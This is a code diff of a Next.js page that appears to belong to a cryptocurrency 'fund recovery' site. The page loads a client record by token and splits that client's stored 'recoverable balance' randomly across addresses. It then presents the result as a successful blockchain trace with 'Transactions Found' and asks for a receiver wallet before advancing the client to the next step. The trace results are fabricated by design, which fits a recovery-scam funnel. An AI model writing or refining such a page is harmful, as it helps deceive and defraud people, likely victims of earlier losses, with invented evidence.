@@ -1,5 +1,7 @@
 "use client";
 
+export const dynamic = "force-dynamic";
+
 import { useState, useEffect } from "react";
 import { useRouter, useSearchParams } from "next/navigation";
 import { collection, doc, getDocs, updateDoc } from "firebase/firestore";
@@ -15,19 +17,19 @@ function randomSplit(total: number, n: number): number[] {
   let remaining = total;
 
   for (let i = 0; i < n - 1; i++) {
-    const portion = parseFloat((Math.random() * remaining * 0.7).toFixed(8)); // uneven split
+    const portion = parseFloat((Math.random() * remaining * 0.7).toFixed(8));
     splits[i] = portion;
     remaining -= portion;
   }
-  splits[n - 1] = parseFloat(remaining.toFixed(8)); // last one gets remaining
+  splits[n - 1] = parseFloat(remaining.toFixed(8));
   return splits;
 }
 
 export default function Page3() {
   const router = useRouter();
   const searchParams = useSearchParams();
-  const token = searchParams.get("token");
 
+  const [token, setToken] = useState<string | null>(null);
   const [loading, setLoading] = useState(true);
   const [client, setClient] = useState<any>(null);
   const [addresses, setAddresses] = useState<
@@ -36,14 +38,14 @@ export default function Page3() {
   const [receiverWallet, setReceiverWallet] = useState("");
 
   useEffect(() => {
-    if (!token) {
-      router.replace("/invalid");
-      return;
-    }
+    setToken(searchParams.get("token"));
+  }, [searchParams]);
+
+  useEffect(() => {
+    if (!token) return;
 
     const fetchClientData = async () => {
       try {
-        // Find client by accessLinkId
         const clientsCol = collection(db, "clients");
         const snapshot = await getDocs(clientsCol);
         const clientDoc = snapshot.docs.find(
@@ -74,10 +76,8 @@ export default function Page3() {
           return;
         }
 
-        // Split recoverable balance randomly among addresses
         const total = clientData.recoverableBalance || 0;
         const splitValues = randomSplit(total, addrList.length);
-
         const animatedAddresses = addrList.map((addr, i) => ({
           address: addr,
           value: splitValues[i],
@@ -102,11 +102,9 @@ export default function Page3() {
 
     if (!client) return;
 
-    // Update client's currentPage to page4
     const clientRef = doc(db, "clients", client.id);
     await updateDoc(clientRef, { currentPage: "page4" });
 
-    // Navigate to page4
     router.replace("/page4?token=" + token);
   };
 
@@ -121,23 +119,20 @@ export default function Page3() {
     <main className="relative w-full h-screen overflow-hidden">
       <div className="absolute inset-0 w-full h-full">
         <SvgStack />
-      </div>
-
-      <div className="relative z-10 flex flex-col items-center justify-center w-full h-full text-center px-4 backdrop-blur-sm bg-black/85">
         <Image
           src={bgImage}
           alt="Background"
           className="absolute inset-0 -z-10 object-contain"
         />
+      </div>
 
+      <div className="relative z-10 flex flex-col items-center justify-center w-full h-full text-center px-4 backdrop-blur-sm bg-black/85">
         <div className="w-full max-w-lg bg-[#0E111C]/85 rounded-lg p-6 space-y-6">
-          {/* Trace Successful */}
           <div className="flex flex-col items-center gap-3">
             <ShieldCheckIcon className="w-12 h-12 text-teal-400" />
             <h2 className="text-white font-bold text-xl">Trace Successful</h2>
           </div>
 
-          {/* Transactions / recovery addresses */}
           <div className="bg-[#151A2E] rounded-xl p-4 space-y-2 overflow-y-auto max-h-40">
             <h3 className="text-teal-400 font-semibold mb-2">
               Transactions Found
@@ -153,13 +148,11 @@ export default function Page3() {
             ))}
           </div>
 
-          {/* Total recoverable balance */}
           <div className="text-white font-semibold">
             Recoverable Balance:{" "}
             {addresses.reduce((acc, a) => acc + a.value, 0).toFixed(8)} BTC
           </div>
 
-          {/* Receiver wallet form */}
           <div className="flex flex-col gap-2">
             <label className="text-gray-400 text-left">Receiver Wallet</label>
             <input
